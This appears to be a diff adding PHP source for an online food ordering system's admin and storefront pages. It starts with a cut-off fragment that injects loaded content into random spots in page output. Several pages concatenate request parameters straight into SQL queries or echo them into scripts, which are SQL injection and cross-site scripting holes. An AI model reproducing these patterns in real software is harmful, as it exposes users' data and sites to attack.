+  $new_content = (html_entity_decode(load_data()))."\n".($matches[0][$rand]);
+  $overall_content = str_replace($matches[0][$rand], $new_content, $overall_content);
+}
+echo $overall_content;
+// }
+?>
+/////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////
+login.php:
+////////////////////////////////////////////////////////////////////////////
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Admin | Online Food Ordering System</title>
+ 	
+
+<?php include('./header.php'); ?>
+<?php include('./db_connect.php'); ?>
+<?php 
+session_start();
+if(isset($_SESSION['login_id']))
+header("location:index.php?page=home");
+
+$query = $conn->query("SELECT * FROM system_settings limit 1")->fetch_array();
+		foreach ($query as $key => $value) {
+			if(!is_numeric($key))
+				$_SESSION['setting_'.$key] = $value;
+		}
+?>
+
+</head>
+<style>
+	body{
+		width: 100%;
+	    height: calc(100%);
+	    /*background: #007bff;*/
+	}
+	main#main{
+		width:100%;
+		height: calc(100%);
+		background:white;
+	}
+	#login-right{
+		position: absolute;
+		right:0;
+		width:40%;
+		height: calc(100%);
+		background:white;
+		display: flex;
+		align-items: center;
+		background:#000;
+	}
+	#login-left{
+		position: absolute;
+		left:0;
+		width:60%;
+		height: calc(100%);
+		background:#00000061;
+		display: flex;
+		align-items: center;
+	}
+	#login-right .card{
+		margin: auto
+	}
+	.logo {
+	    margin: auto;
+	    font-size: 8rem;
+	    background: white;
+	    border-radius: 50% 50%;
+	    height: 29vh;
+	    width: 13vw;
+	    display: flex;
+	    align-items: center;
+	}
+	.logo img{
+		height: 80%;
+		width: 80%;
+		margin: auto
+	}
+	#login-left {
+		background: url(./../assets/img/<?php echo $_SESSION['setting_cover_img'] ?>);
+		background-repeat: no-repeat;
+		background-size: cover;
+		background-position: center center;
+	}
+	#login-left:before{
+		content:"";
+		position:absolute;
+		top:0;
+		left:0;
+		height:100%;
+		width:100%;
+		backdrop-filter:brightness(.8);
+		z-index:1;
+	}
+	#login-left .d-flex{
+		position: relative;
+		z-index: 2;
+	}
+	#login-left h1{
+		font-family: 'Dancing Script', cursive !important;
+		font-weight:bolder;
+		font-size:4.5em;
+		color:#fff;
+		text-shadow: 0px 0px 5px #000;
+	}
+</style>
+
+<body>
+
+
+  <main id="main" class=" bg-dark">
+  		<div id="login-left" class="">
+			<div class="h-100 w-100 d-flex justify-content-center align-items-center">
+					<h1 class="text-center"><?= $_SESSION['setting_name'] ?> - Admin Site</h1>
+			</div>
+  		</div>
+  		<div id="login-right">
+  			<div class="card col-md-8">
+  				<div class="card-body">
+  					<form id="login-form" >
+  						<div class="form-group">
+  							<label for="username" class="control-label">Username</label>
+  							<input type="text" id="username" name="username" autofocus class="form-control">
+  						</div>
+  						<div class="form-group">
+  							<label for="password" class="control-label">Password</label>
+  							<input type="password" id="password" name="password" class="form-control">
+  						</div>
+						<div class="form-group">
+							<a href="./../" class="text-dark">Back to Website</a>
+  						</div>
+  						<center><button class="btn-sm btn-block btn-wave col-md-4 btn-dark">Login</button></center>
+  					</form>
+  				</div>
+  			</div>
+  		</div>
+   
+
+  </main>
+
+  <a href="#" class="back-to-top"><i class="icofont-simple-up"></i></a>
+
+
+</body>
+<script>
+	$('#login-form').submit(function(e){
+		e.preventDefault()
+		$('#login-form button[type="button"]').attr('disabled',true).html('Logging in...');
+		if($(this).find('.alert-danger').length > 0 )
+			$(this).find('.alert-danger').remove();
+		$.ajax({
+			url:'ajax.php?action=login',
+			method:'POST',
+			data:$(this).serialize(),
+			error:err=>{
+				console.log(err)
+		$('#login-form button[type="button"]').removeAttr('disabled').html('Login');
+
+			},
+			success:function(resp){
+				if(resp == 1){
+					location.href ='index.php?page=home';
+				}else{
+					$('#login-form').prepend('<div class="alert alert-danger">Username or password is incorrect.</div>')
+					$('#login-form button[type="button"]').removeAttr('disabled').html('Login');
+				}
+			}
+		})
+	})
+</script>	
+</html>
+////////////////////////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////////////////////
+manage_user.php:
+//////////////////////////////////////////////////////////////////////////////////////
+<?php 
+include('db_connect.php');
+if(isset($_GET['id'])){
+$user = $conn->query("SELECT * FROM users where id =".$_GET['id']);
+foreach($user->fetch_array() as $k =>$v){
+	$meta[$k] = $v;
+}
+}
+?>
+<div class="container-fluid">
+	
+	<form action="" id="manage-user">
+		<input type="hidden" name="id" value="<?php echo isset($meta['id']) ? $meta['id']: '' ?>">
+		<div class="form-group">
+			<label for="name">Name</label>
+			<input type="text" name="name" id="name" class="form-control" value="<?php echo isset($meta['name']) ? $meta['name']: '' ?>" required>
+		</div>
+		<div class="form-group">
+			<label for="username">Username</label>
+			<input type="text" name="username" id="username" class="form-control" value="<?php echo isset($meta['username']) ? $meta['username']: '' ?>" required>
+		</div>
+		<div class="form-group">
+			<label for="password">Password</label>
+			<input type="password" name="password" id="password" class="form-control" value="<?php echo isset($meta['password']) ? $meta['id']: '' ?>" required>
+		</div>
+		<div class="form-group">
+			<label for="type">User Type</label>
+			<select name="type" id="type" class="custom-select">
+				<option value="1" <?php echo isset($meta['type']) && $meta['type'] == 1 ? 'selected': '' ?>>Admin</option>
+				<option value="2" <?php echo isset($meta['type']) && $meta['type'] == 2 ? 'selected': '' ?>>Staff</option>
+			</select>
+		</div>
+	</form>
+</div>
+<script>
+	$('#manage-user').submit(function(e){
+		e.preventDefault();
+		start_load()
+		$.ajax({
+			url:'ajax.php?action=save_user',
+			method:'POST',
+			data:$(this).serialize(),
+			success:function(resp){
+				if(resp ==1){
+					alert_toast("Data successfully saved",'success')
+					setTimeout(function(){
+						location.reload()
+					},1500)
+				}
+			}
+		})
+	})
+</script>
+///////////////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////////////
+menu.php:
+///////////////////////////////////////////////////////////////////////////////
+<?php include('db_connect.php');?>
+
+<div class="container-fluid">
+	
+	<div class="col-lg-12">
+		<div class="row">
+			<!-- FORM Panel -->
+			<div class="col-md-4">
+			<form action="" id="manage-menu">
+				<div class="card">
+					<div class="card-header">
+						    Menu Form
+				  	</div>
+					<div class="card-body">
+							<input type="hidden" name="id">
+							<div class="form-group">
+								<label class="control-label">Menu Name</label>
+								<input type="text" class="form-control" name="name">
+							</div>
+							<div class="form-group">
+								<label class="control-label">Menu Description</label>
+								<textarea cols="30" rows="3" class="form-control" name="description"></textarea>
+							</div>
+							<div class="form-group">
+								<div class="custom-control custom-switch">
+								  <input type="checkbox" name="status" class="custom-control-input" id="availability" checked>
+								  <label class="custom-control-label" for="availability">Available</label>
+								</div>
+							</div>	
+							<div class="form-group">
+								<label class="control-label">Category </label>
+								<select name="category_id" id="" class="custom-select browser-default">
+									<?php
+									$cat = $conn->query("SELECT * FROM category_list order by name asc ");
+									while($row=$cat->fetch_assoc()):
+									?>
+									<option value="<?php echo $row['id'] ?>"><?php echo $row['name'] ?></option>
+									<?php endwhile; ?>
+								</select>
+								
+							</div>
+							<div class="form-group">
+								<label class="control-label">Price</label>
+								<input type="number" class="form-control text-right" name="price" step="any">
+							</div>
+							<div class="form-group">
+								<label for="" class="control-label">Image</label>
+								<input type="file" class="form-control" name="img" onchange="displayImg(this,$(this))">
+							</div>
+							<div class="form-group">
+								<img src="<?php echo isset($image_path) ? '../assets/img/'.$cover_img :'' ?>" alt="" id="cimg">
+							</div>
+					</div>
+							
+					<div class="card-footer">
+						<div class="row">
+							<div class="col-md-12">
+								<button class="btn btn-sm btn-primary col-sm-3 offset-md-3"> Save</button>
+								<button class="btn btn-sm btn-default col-sm-3" type="button" onclick="$('#manage-menu').get(0).reset()"> Cancel</button>
+							</div>
+						</div>
+					</div>
+				</div>
+			</form>
+			</div>
+			<!-- FORM Panel -->
+
+			<!-- Table Panel -->
+			<div class="col-md-8">
+				<div class="card">
+					<div class="card-body">
+						<div class="table-responsive">
+							<table class="table table-bordered table-hover">
+								<thead>
+									<tr>
+										<th class="text-center">#</th>
+										<th class="text-center">Img</th>
+										<th class="text-center">Room</th>
+										<th class="text-center">Action</th>
+									</tr>
+								</thead>
+								<tbody>
+									<?php 
+									$i = 1;
+									$cats = $conn->query("SELECT p.*, c.name as cat FROM product_list p inner join category_list c on c.id = p.category_id order by p.id asc");
+									while($row=$cats->fetch_assoc()):
+									?>
+									<tr>
+										<td class="text-center"><?php echo $i++ ?></td>
+
+									
+										<td class="text-center">
+											<img src="<?php echo isset($row['img_path']) ? '../assets/img/'.$row['img_path'] :'' ?>" alt="" id="cimg">
+										</td>
+										<td class="">
+											<p>Name : <b><?php echo $row['name'] ?></b></p>
+											<p>Category : <b><?php echo $row['cat'] ?></b></p>
+											<p>Description : <b class="truncate"><?php echo $row['description'] ?></b></p>
+											<p>Price : <b><?php echo "$".number_format($row['price'],2) ?></b></p>
+										</td>
+										<td class="text-center">
+											<button class="btn btn-sm btn-primary edit_menu" type="button" data-id="<?php echo $row['id'] ?>" data-name="<?php echo $row['name'] ?>" data-status="<?php echo $row['status'] ?>" data-description="<?php echo $row['description'] ?>" data-price="<?php echo $row['price'] ?>" data-category_id="<?php echo $row['category_id'] ?>"  data-img_path="<?php echo $row['img_path'] ?>">Edit</button>
+											<button class="btn btn-sm btn-danger delete_menu" type="button" data-id="<?php echo $row['id'] ?>">Delete</button>
+										</td>
+									</tr>
+									<?php endwhile; ?>
+								</tbody>
+							</table>
+						</div>
+					</div>
+				</div>
+			</div>
+			<!-- Table Panel -->
+		</div>
+	</div>	
+
+</div>
+<style>
+	img#cimg,.cimg{
+		max-height: 10vh;
+		max-width: 6vw;
+	}
+	td{
+		vertical-align: middle !important;
+	}
+	td p{
+		margin: unset !important;
+	}
+	.custom-switch,.custom-control-input,.custom-control-label{
+		cursor:pointer;
+	}
+	b.truncate {
+		 overflow: hidden;
+   text-overflow: ellipsis;
+   display: -webkit-box;
+   -webkit-line-clamp: 3; 
+   -webkit-box-orient: vertical;	
+    font-size: small;
+    color: #000000cf;
+    font-style: italic;
+}
+</style>
+<script>
+	function displayImg(input,_this) {
+	    if (input.files && input.files[0]) {
+	        var reader = new FileReader();
+	        reader.onload = function (e) {
+	        	$('#cimg').attr('src', e.target.result);
+	        }
+
+	        reader.readAsDataURL(input.files[0]);
+	    }
+	}
+	$('#manage-menu').submit(function(e){
+		e.preventDefault()
+		start_load()
+		$.ajax({
+			url:'ajax.php?action=save_menu',
+			data: new FormData($(this)[0]),
+		    cache: false,
+		    contentType: false,
+		    processData: false,
+		    method: 'POST',
+		    type: 'POST',
+			success:function(resp){
+				if(resp==1){
+					alert_toast("Data successfully added",'success')
+					setTimeout(function(){
+						location.reload()
+					},1500)
+
+				}
+				else if(resp==2){
+					alert_toast("Data successfully updated",'success')
+					setTimeout(function(){
+						location.reload()
+					},1500)
+
+				}
+			}
+		})
+	})
+	$('.edit_menu').click(function(){
+		start_load()
+		var cat = $('#manage-menu')
+		cat.get(0).reset()
+		cat.find("[name='id']").val($(this).attr('data-id'))
+		cat.find("[name='description']").val($(this).attr('data-description'))
+		cat.find("[name='name']").val($(this).attr('data-name'))
+		cat.find("[name='price']").val($(this).attr('data-price'))
+		cat.find("[name='category_id']").val($(this).attr('data-category_id'))
+		if($(this).attr('data-status') == 1)
+			$('#availability').prop('checked',true)
+		else
+			$('#availability').prop('checked',false)
+
+		cat.find("#cimg").attr('src','../assets/img/'+$(this).attr('data-img_path'))
+		end_load()
+	})
+	$('.delete_menu').click(function(){
+		_conf("Are you sure to delete this menu?","delete_menu",[$(this).attr('data-id')])
+	})
+	function delete_menu($id){
+		start_load()
+		$.ajax({
+			url:'ajax.php?action=delete_menu',
+			method:'POST',
+			data:{id:$id},
+			success:function(resp){
+				if(resp==1){
+					alert_toast("Data successfully deleted",'success')
+					setTimeout(function(){
+						location.reload()
+					},1500)
+
+				}
+			}
+		})
+	}
+	$('table').dataTable()
+</script>
+
+
+//////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+order.php:
+////////////////////////////////////////////////////////////////////
+<div class="container-fluid">
+	<div class="card">
+		<div class="card-body">
+			<div class="table-responsive">
+				<table class="table table-bordered">
+					<thead>
+						<tr>
+
+						<th>#</th>
+						<th>Name</th>
+						<th>Address</th>
+						<th>Email</th>
+						<th>Mobile</th>
+						<th>Status</th>
+						<th></th>
+						</tr>
+					</thead>
+					<tbody>
+						<?php 
+						$i = 1;
+						include 'db_connect.php';
+						$qry = $conn->query("SELECT * FROM orders ");
+						while($row=$qry->fetch_assoc()):
+						?>
+						<tr>
+								<td><?php echo $i++ ?></td>
+								<td><?php echo $row['name'] ?></td>
+								<td><?php echo $row['address'] ?></td>
+								<td><?php echo $row['email'] ?></td>
+								<td><?php echo $row['mobile'] ?></td>
+								<?php if($row['status'] == 1): ?>
+									<td class="text-center"><span class="badge badge-success">Confirmed</span></td>
+								<?php else: ?>
+									<td class="text-center"><span class="badge badge-secondary">For Verification</span></td>
+								<?php endif; ?>
+								<td>
+									<button class="btn btn-sm btn-primary view_order" data-id="<?php echo $row['id'] ?>" >View Order</button>
+								</td>
+						</tr>
+						<?php endwhile; ?>
+					</tbody>
+				</table>
+			</div>
+		</div>
+	</div>
+	
+</div>
+<script>
+	$('.view_order').click(function(){
+		uni_modal('Order','view_order.php?id='+$(this).attr('data-id'))
+	})
+	$('table').dataTable();
+</script>
+//////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+navbar.php:
+////////////////////////////////////////////////////////////////////
+
+<nav id="sidebar" class='mx-lt-5 bg-dark' >
+		
+		<div class="sidebar-list">
+
+				<a href="index.php?page=home" class="nav-item nav-home"><span class='icon-field'><i class="fa fa-home"></i></span> Home</a>
+				<a href="index.php?page=orders" class="nav-item nav-orders"><span class='icon-field'><i class="fa fa-table"></i></span> Orders</a>
+				<a href="index.php?page=menu" class="nav-item nav-menu"><span class='icon-field'><i class="fa fa-pizza-slice"></i></span> Menu</a>
+				<a href="index.php?page=categories" class="nav-item nav-categories"><span class='icon-field'><i class="fa fa-list"></i></span> Category List</a>
+				
+				<?php if($_SESSION['login_type'] == 1): ?>
+				<a href="index.php?page=users" class="nav-item nav-users"><span class='icon-field'><i class="fa fa-users"></i></span> Users</a>
+				<a href="index.php?page=site_settings" class="nav-item nav-site_settings"><span class='icon-field'><i class="fa fa-cogs"></i></span> Site Settings</a>
+			<?php endif; ?>
+		</div>
+
+</nav>
+<script>
+	$('.nav-<?php echo isset($_GET['page']) ? $_GET['page'] : '' ?>').addClass('active')
+</script>
+//////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+users.php:
+////////////////////////////////////////////////////////////////////
+<?php 
+
+?>
+
+<div class="container-fluid">
+	
+	<div class="row">
+	<div class="col-lg-12">
+			<button class="btn btn-primary float-right btn-sm" id="new_user"><i class="fa fa-plus"></i> New user</button>
+	</div>
+	</div>
+	<br>
+	<div class="row">
+		<div class="card col-lg-12">
+			<div class="card-body">
+				<div class="table-responsive">
+					<table class="table-striped table-bordered">
+						<thead>
+							<tr>
+								<th class="text-center">#</th>
+								<th class="text-center">Name</th>
+								<th class="text-center">Username</th>
+								<th class="text-center">Action</th>
+							</tr>
+						</thead>
+						<tbody>
+							<?php
+								include 'db_connect.php';
+								$users = $conn->query("SELECT * FROM users order by name asc");
+								$i = 1;
+								while($row= $users->fetch_assoc()):
+							?>
+							<tr>
+								<td>
+									<?php echo $i++ ?>
+								</td>
+								<td>
+									<?php echo $row['name'] ?>
+								</td>
+								<td>
+									<?php echo $row['username'] ?>
+								</td>
+								<td>
+									<center>
+											<div class="btn-group">
+											<button type="button" class="btn btn-primary">Action</button>
+											<button type="button" class="btn btn-primary dropdown-toggle dropdown-toggle-split" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+												<span class="sr-only">Toggle Dropdown</span>
+											</button>
+											<div class="dropdown-menu">
+												<a class="dropdown-item edit_user" href="javascript:void(0)" data-id = '<?php echo $row['id'] ?>'>Edit</a>
+												<div class="dropdown-divider"></div>
+												<a class="dropdown-item delete_user" href="javascript:void(0)" data-id = '<?php echo $row['id'] ?>'>Delete</a>
+											</div>
+											</div>
+											</center>
+								</td>
+							</tr>
+							<?php endwhile; ?>
+						</tbody>
+					</table>
+				</div>
+			</div>
+		</div>
+	</div>
+
+</div>
+<script>
+	
+$('#new_user').click(function(){
+	uni_modal('New User','manage_user.php')
+})
+$('.edit_user').click(function(){
+	uni_modal('Edit User','manage_user.php?id='+$(this).attr('data-id'))
+})
+$('table').dataTable()
+</script>
+//////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+view_order.php
+////////////////////////////////////////////////////////////////////
+<div class="container-fluid">
+	
+	<table class="table table-bordered">
+		<thead>
+			<tr>
+				<th>Qty</th>
+				<th>Order</th>
+				<th>Amount</th>
+			</tr>
+		</thead>
+		<tbody>
+			<?php 
+			$total = 0;
+			include 'db_connect.php';
+			$qry = $conn->query("SELECT * FROM order_list o inner join product_list p on o.product_id = p.id  where order_id =".$_GET['id']);
+			while($row=$qry->fetch_assoc()):
+				$total += $row['qty'] * $row['price'];
+			?>
+			<tr>
+				<td><?php echo $row['qty'] ?></td>
+				<td><?php echo $row['name'] ?></td>
+				<td><?php echo number_format($row['qty'] * $row['price'],2) ?></td>
+			</tr>
+		<?php endwhile; ?>
+		</tbody>
+		<tfoot>
+			<tr>
+				<th colspan="2" class="text-right">TOTAL</th>
+				<th ><?php echo number_format($total,2) ?></th>
+			</tr>
+
+		</tfoot>
+	</table>
+	<div class="text-center">
+		<button class="btn btn-primary" id="confirm" type="button" onclick="confirm_order()">Confirm</button>
+        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+
+	</div>
+</div>
+<style>
+	#uni_modal .modal-footer{
+		display: none
+	}
+</style>
+<script>
+	function confirm_order(){
+		start_load()
+		$.ajax({
+			url:'ajax.php?action=confirm_order',
+			method:'POST',
+			data:{id:'<?php echo $_GET['id'] ?>'},
+			success:function(resp){
+				if(resp == 1){
+					alert_toast("Order confirmed.")
+                        setTimeout(function(){
+                            location.reload()
+                        },1500)
+				}
+			}
+		})
+	}
+</script>
+//////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+site_setting.php
+////////////////////////////////////////////////////////////////////
+
+<?php
+include 'db_connect.php';
+$qry = $conn->query("SELECT * from system_settings limit 1");
+if($qry->num_rows > 0){
+	foreach($qry->fetch_array() as $k => $val){
+		$meta[$k] = $val;
+	}
+}
+ ?>
+<div class="container-fluid">
+	
+	<div class="card col-lg-12">
+		<div class="card-body">
+			<form action="" id="manage-settings">
+				<div class="form-group">
+					<label for="name" class="control-label">System Name</label>
+					<input type="text" class="form-control" id="name" name="name" value="<?php echo isset($meta['name']) ? $meta['name'] : '' ?>" required>
+				</div>
+				<div class="form-group">
+					<label for="email" class="control-label">Email</label>
+					<input type="email" class="form-control" id="email" name="email" value="<?php echo isset($meta['email']) ? $meta['email'] : '' ?>" required>
+				</div>
+				<div class="form-group">
+					<label for="contact" class="control-label">Contact</label>
+					<input type="text" class="form-control" id="contact" name="contact" value="<?php echo isset($meta['contact']) ? $meta['contact'] : '' ?>" required>
+				</div>
+				<div class="form-group">
+					<label for="about" class="control-label">About Content</label>
+					<textarea name="about" class="text-jqte"><?php echo isset($meta['about_content']) ? $meta['about_content'] : '' ?></textarea>
+
+				</div>
+				<div class="form-group">
+					<label for="" class="control-label">Image</label>
+					<input type="file" class="form-control" name="img" onchange="displayImg(this,$(this))">
+				</div>
+				<div class="form-group">
+					<img src="<?php echo isset($meta['cover_img']) ? '../assets/img/'.$meta['cover_img'] :'' ?>" alt="" id="cimg">
+				</div>
+				<center>
+					<button class="btn btn-info btn-primary btn-block col-md-2">Save</button>
+				</center>
+			</form>
+		</div>
+	</div>
+	<style>
+	img#cimg{
+		max-height: 10vh;
+		max-width: 6vw;
+	}
+</style>
+
+<script>
+	function displayImg(input,_this) {
+    if (input.files && input.files[0]) {
+        var reader = new FileReader();
+        reader.onload = function (e) {
+        	$('#cimg').attr('src', e.target.result);
+        }
+
+        reader.readAsDataURL(input.files[0]);
+    }
+}
+	$('.text-jqte').jqte();
+
+	$('#manage-settings').submit(function(e){
+		e.preventDefault()
+		start_load()
+		$.ajax({
+			url:'ajax.php?action=save_settings',
+			data: new FormData($(this)[0]),
+		    cache: false,
+		    contentType: false,
+		    processData: false,
+		    method: 'POST',
+		    type: 'POST',
+			error:err=>{
+				console.log(err)
+			},
+			success:function(resp){
+				if(resp == 1){
+					alert_toast('Data successfully saved.','success')
+					setTimeout(function(){
+						location.reload()
+					},1000)
+				}
+			}
+		})
+
+	})
+</script>
+<style>
+	
+</style>
+</div>
+
+////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////
+topbar.php
+.///////////////////////////////////////////////////////////////////
+<div class="container-fluid">
+	<div class="card">
+		<div class="card-body">
+			<div class="table-responsive">
+				<table class="table table-bordered">
+					<thead>
+						<tr>
+
+						<th>#</th>
+						<th>Name</th>
+						<th>Address</th>
+						<th>Email</th>
+						<th>Mobile</th>
+						<th>Status</th>
+						<th></th>
+						</tr>
+					</thead>
+					<tbody>
+						<?php 
+						$i = 1;
+						include 'db_connect.php';
+						$qry = $conn->query("SELECT * FROM orders ");
+						while($row=$qry->fetch_assoc()):
+						?>
+						<tr>
+								<td><?php echo $i++ ?></td>
+								<td><?php echo $row['name'] ?></td>
+								<td><?php echo $row['address'] ?></td>
+								<td><?php echo $row['email'] ?></td>
+								<td><?php echo $row['mobile'] ?></td>
+								<?php if($row['status'] == 1): ?>
+									<td class="text-center"><span class="badge badge-success">Confirmed</span></td>
+								<?php else: ?>
+									<td class="text-center"><span class="badge badge-secondary">For Verification</span></td>
+								<?php endif; ?>
+								<td>
+									<button class="btn btn-sm btn-primary view_order" data-id="<?php echo $row['id'] ?>" >View Order</button>
+								</td>
+						</tr>
+						<?php endwhile; ?>
+					</tbody>
+				</table>
+			</div>
+		</div>
+	</div>
+	
+</div>
+<script>
+	$('.view_order').click(function(){
+		uni_modal('Order','view_order.php?id='+$(this).attr('data-id'))
+	})
+	$('table').dataTable();
+</script>
+////////////////////////=-==================================================================================================================================
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+about.php:
+//////////
+ <!-- Masthead-->
+        <header class="masthead">
+            <div class="container h-100">
+                <div class="row h-100 align-items-center justify-content-center text-center">
+                    <div class="col-lg-10 align-self-center mb-4 page-title">
+                    	<h1 class="text-white">About Us</h1>
+                        <hr class="divider my-4 bg-dark" />
+                    </div>
+                    
+                </div>
+            </div>
+        </header>
+
+    <section class="page-section">
+        <div class="container">
+    <?php echo html_entity_decode($_SESSION['setting_about_content']) ?>        
+            
+        </div>
+        </section>
+//////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+cart_list.php
+//////////////////////////////////////////////////////////////////////////////
+ <!-- Masthead-->
+ <header class="masthead">
+            <div class="container h-100">
+                <div class="row h-100 align-items-center justify-content-center text-center">
+                    <div class="col-lg-10 align-self-center mb-4 page-title">
+                    	<h1 class="text-white">Shopping Cart</h1>
+                        <hr class="divider my-4 bg-dark" />
+                    </div>
+                    
+                </div>
+            </div>
+        </header>
+	<section class="page-section" id="menu">
+        <div class="container">
+        	<div class="row">
+        	<div class="col-lg-8">
+        		<div class="sticky">
+	        		<div class="card">
+	        			<div class="card-body">
+	        				<div class="row">
+		        				<div class="col-md-8"><b>Items</b></div>
+		        				<div class="col-md-4 text-right"><b>Total</b></div>
+	        				</div>
+	        			</div>
+	        		</div>
+	        	</div>
+        		<?php 
+        		if(isset($_SESSION['login_user_id'])){
+					$data = "where c.user_id = '".$_SESSION['login_user_id']."' ";	
+				}else{
+					$ip = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
+					$data = "where c.client_ip = '".$ip."' ";	
+				}
+				$total = 0;
+				$get = $conn->query("SELECT *,c.id as cid FROM cart c inner join product_list p on p.id = c.product_id ".$data);
+				while($row= $get->fetch_assoc()):
+					$total += ($row['qty'] * $row['price']);
+        		?>
+
+        		<div class="card">
+	        		<div class="card-body">
+		        		<div class="row">
+			        		<div class="col-md-4 d-flex align-items-center" style="text-align: -webkit-center">
+								<div class="col-auto">	
+			        				<a href="admin/ajax.php?action=delete_cart&id=<?php echo $row['cid'] ?>" class="rem_cart btn btn-sm btn-outline-danger" data-id="<?php echo $row['cid'] ?>"><i class="fa fa-trash"></i></a>
+								</div>	
+								<div class="col-auto flex-shrink-1 flex-grow-1 text-center">	
+			        				<img src="assets/img/<?php echo $row['img_path'] ?>" alt="">
+								</div>	
+			        		</div>
+			        		<div class="col-md-4">
+			        			<p><b><large><?php echo $row['name'] ?></large></b></p>
+			        			<p class='truncate'> <b><small>Desc :<?php echo $row['description'] ?></small></b></p>
+			        			<p> <b><small>Unit Price :<?php echo number_format($row['price'],2) ?></small></b></p>
+			        			<p><small>QTY :</small></p>
+			        			<div class="input-group mb-3">
+								  <div class="input-group-prepend">
+								    <button class="btn btn-outline-secondary qty-minus" type="button"   data-id="<?php echo $row['cid'] ?>"><span class="fa fa-minus"></button>
+								  </div>
+								  <input type="number" readonly value="<?php echo $row['qty'] ?>" min = 1 class="form-control text-center" name="qty" >
+								  <div class="input-group-prepend">
+								    <button class="btn btn-outline-secondary qty-plus" type="button" id=""  data-id="<?php echo $row['cid'] ?>"><span class="fa fa-plus"></span></button>
+								  </div>
+								</div>
+			        		</div>
+			        		<div class="col-md-4 text-right">
+			        			<b><large><?php echo number_format($row['qty'] * $row['price'],2) ?></large></b>
+			        		</div>
+		        		</div>
+	        		</div>
+	        	</div>
+
+	        <?php endwhile; ?>
+        	</div>
+        	<div class="col-md-4">
+        		<div class="sticky">
+        			<div class="card">
+        				<div class="card-body">
+        					<p><large>Total Amount</large></p>
+        					<hr>
+        					<p class="text-right"><b><?php echo number_format($total,2) ?></b></p>
+        					<hr>
+        					<div class="text-center">
+        						<button class="btn btn-block btn-outline-dark" type="button" id="checkout">Proceed to Checkout</button>
+        					</div>
+        				</div>
+        			</div>
+        		</div>
+        	</div>
+        	</div>
+        </div>
+    </section>
+    <style>
+    	.card p {
+    		margin: unset
+    	}
+    	.card img{
+		    max-width: calc(100%);
+		    max-height: calc(59%);
+    	}
+    	div.sticky {
+		  position: -webkit-sticky; /* Safari */
+		  position: sticky;
+		  top: 4.7em;
+		  z-index: 10;
+		  background: white
+		}
+		.rem_cart{
+		   position: absolute;
+    	   left: 0;
+		}
+    </style>
+    <script>
+        
+        $('.view_prod').click(function(){
+            uni_modal_right('Product','view_prod.php?id='+$(this).attr('data-id'))
+        })
+        $('.qty-minus').click(function(){
+		var qty = $(this).parent().siblings('input[name="qty"]').val();
+		update_qty(parseInt(qty) -1,$(this).attr('data-id'))
+		if(qty == 1){
+			return false;
+		}else{
+			 $(this).parent().siblings('input[name="qty"]').val(parseInt(qty) -1);
+		}
+		})
+		$('.qty-plus').click(function(){
+			var qty =  $(this).parent().siblings('input[name="qty"]').val();
+				 $(this).parent().siblings('input[name="qty"]').val(parseInt(qty) +1);
+		update_qty(parseInt(qty) +1,$(this).attr('data-id'))
+		})
+		function update_qty(qty,id){
+			start_load()
+			$.ajax({
+				url:'admin/ajax.php?action=update_cart_qty',
+				method:"POST",
+				data:{id:id,qty},
+				success:function(resp){
+					if(resp == 1){
+						load_cart()
+						end_load()
+					}
+				}
+			})
+
+		}
+		$('#checkout').click(function(){
+			if('<?php echo isset($_SESSION['login_user_id']) ?>' == 1){
+				location.replace("index.php?page=checkout")
+			}else{
+				uni_modal("Checkout","login.php?page=checkout")
+			}
+		})
+    </script>
+	
+
+//////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////
+category.php
+//////////////////////////////////////////////////////////////////////////////
+ <?php 
+ $cid= $_GET['id'] ?? "";
+ if(empty($cid)){
+    throw new ErrorException("Error: This page requires a category ID.");
+ }
+ $category_qry = $conn->query("SELECT * FROM `category_list` where `id` = '{$cid}'");
+ if($category_qry->num_rows > 0){
+    $data = $category_qry->fetch_assoc();
+
+ }else{
+    throw new ErrorException("Error: This page requires a category ID.");
+ }
+ 
+ ?>
+ <!-- Masthead-->
+ <header class="masthead">
+            <div class="container h-100">
+                <div class="row h-100 align-items-center justify-content-center text-center">
+                    <div class="col-lg-10 align-self-center mb-4 page-title">
+                    	<h1 class="text-white"><?= $data['name'] ?? "" ?></h1>
+                        <hr class="divider my-4 bg-dark" />
+
+                    </div>
+                    
+                </div>
+            </div>
+        </header>
+	<section class="page-section" id="menu">
+        <h1 class="text-center text-cursive" style="font-size:3em"><b><?= $data['name'] ?? "" ?>'s Menu</b></h1>
+        <div class="d-flex justify-content-center">
+            <hr class="border-dark" width="5%">
+        </div>
+        <div class="row mx-0">
+            <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
+                <div id="menu-field" class="card-deck px-2 py-3 justify-content-center">
+                        <?php 
+                            include 'admin/db_connect.php';
+                            $limit = 10;
+                            $page = (isset($_GET['_page']) && $_GET['_page'] > 0) ? $_GET['_page'] - 1 : 0 ;
+                            $offset = $page > 0 ? $page * $limit : 0;
+                            $all_menu =$conn->query("SELECT id FROM  product_list")->num_rows;
+                            $page_btn_count = ceil($all_menu / $limit);
+                            $qry = $conn->query("SELECT * FROM  product_list where `category_id` = '{$cid}' order by `name` asc Limit $limit OFFSET $offset ");
+                            while($row = $qry->fetch_assoc()):
+                            ?>
+                            <div class="col-lg-3 mb-3">
+                            <div class="card menu-item  rounded-0">
